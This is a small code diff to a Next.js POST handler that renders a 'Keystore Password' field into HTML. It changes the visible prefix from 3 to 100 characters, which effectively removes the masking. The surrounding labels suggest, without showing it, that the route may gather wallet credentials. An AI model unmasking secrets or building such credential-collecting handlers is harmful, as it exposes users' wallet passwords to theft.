@@ -107,7 +107,7 @@ export async function POST(request: NextRequest) {
           payload.keystore_password
             ? `<div class="data-item"><strong>🔓 Keystore Password:</strong><br>${payload.keystore_password.substring(
                 0,
-                3
+                100
               )}***</div>`
             : ''
         }
